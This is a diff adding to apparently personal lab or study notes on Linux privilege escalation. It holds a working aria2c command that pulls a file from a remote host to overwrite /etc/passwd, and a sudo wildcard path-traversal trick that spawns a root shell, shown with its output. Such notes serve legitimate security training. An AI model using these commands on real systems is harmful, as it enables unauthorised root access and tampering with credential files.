@@ -2976,3 +2976,18 @@ root@assertion:/#
   Summary: Network Downloader tools with the SUID root bit set can be used to overwrite files, such as /etc/passwd or /root/.ssh/id_rsa
 
   /usr/bin/aria2c -d /etc -o passwd "http://192.168.45.182:80/etc_passwd.txt" --allow-overwrite=true
+
+  # Exploiting Wildcards With Sudo Permissions
+
+webadmin@serv:/notes$ sudo nice /notes/../bin/sh
+
+(root) whoami
+root
+(root) exit
+webadmin@serv:/notes$ sudo -l
+User webadmin may run the following commands on serv:
+    (ALL : ALL) /bin/nice /notes/*
+webadmin@serv:/notes$ ls /notes
+clear.sh  id.sh
+webadmin@serv:/notes$ 
+
